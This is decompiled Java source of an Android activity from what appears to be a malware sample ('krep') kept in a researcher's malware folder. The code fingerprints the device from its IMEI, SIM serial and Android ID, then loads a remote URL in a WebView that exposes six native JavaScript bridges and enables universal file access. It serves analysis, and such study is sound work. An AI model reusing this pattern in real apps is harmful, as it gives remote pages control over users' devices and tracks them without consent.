package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.webkit.WebSettings;
import android.webkit.WebView;
import java.util.UUID;

public class MasterPage
  extends Activity
{
  private String template = "http://yandex.ru";
  
  public static String getUniqueID(Context paramContext)
  {
    Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
    str = ((TelephonyManager)localObject).getDeviceId();
    localObject = ((TelephonyManager)localObject).getSimSerialNumber();
    localObject = new UUID(Settings.Secure.getString(paramContext.getContentResolver(), "android_id").hashCode(), str.hashCode() << 32 | ((String)localObject).hashCode()).toString();
    str = "";
    try
    {
      ApplicationInfo localApplicationInfo = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      paramContext = str;
      if (localApplicationInfo.metaData != null) {
        paramContext = localApplicationInfo.metaData.getString("sub");
      }
    }
    catch (PackageManager.NameNotFoundException paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        paramContext = str;
      }
    }
    return localObject + "-" + paramContext;
  }
  
  @SuppressLint({"NewApi"})
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    paramBundle = getIntent();
    if (paramBundle != null) {
      this.template = paramBundle.getStringExtra("url");
    }
    paramBundle = (LayoutInflater)getSystemService("layout_inflater");
    if (this.template.contains("#full"))
    {
      getApplication().setTheme(16973841);
      this.template = this.template.substring(0, this.template.length() - 5);
      setContentView(2130903042);
    }
    for (;;)
    {
      paramBundle = (WebView)findViewById(2131099649);
      paramBundle.setBackgroundColor(0);
      paramBundle.addJavascriptInterface(new MeSetting(this), "MeSetting");
      paramBundle.addJavascriptInterface(new MeSystem(this), "MeSystem");
      paramBundle.addJavascriptInterface(new MeFile(this), "MeFile");
      paramBundle.addJavascriptInterface(new MePackage(this), "MePackage");
      paramBundle.addJavascriptInterface(new MeContent(this), "MeContent");
      paramBundle.addJavascriptInterface(new MeAction(this), "MeAction");
      Object localObject = paramBundle.getSettings();
      ((WebSettings)localObject).setSavePassword(true);
      ((WebSettings)localObject).setSaveFormData(true);
      ((WebSettings)localObject).setAllowFileAccess(true);
      if (Build.VERSION.SDK_INT >= 16)
      {
        ((WebSettings)localObject).setAllowFileAccessFromFileURLs(true);
        ((WebSettings)localObject).setAllowUniversalAccessFromFileURLs(true);
      }
      ((WebSettings)localObject).setJavaScriptEnabled(true);
      ((WebSettings)localObject).setUserAgentString("Hash: " + getUniqueID(this));
      try
      {
        localObject = getPackageManager().getApplicationInfo(getPackageName(), 128);
        if (((ApplicationInfo)localObject).metaData != null) {
          ((ApplicationInfo)localObject).metaData.getString("domain");
        }
        if (this.template.length() > 0) {
          paramBundle.loadUrl(this.template);
        }
        return;
        getApplication().setTheme(16973840);
        setContentView(2130903041);
      }
      catch (PackageManager.NameNotFoundException localNameNotFoundException)
      {
        for (;;)
        {
          localNameNotFoundException.printStackTrace();
        }
      }
    }
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/MasterPage.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */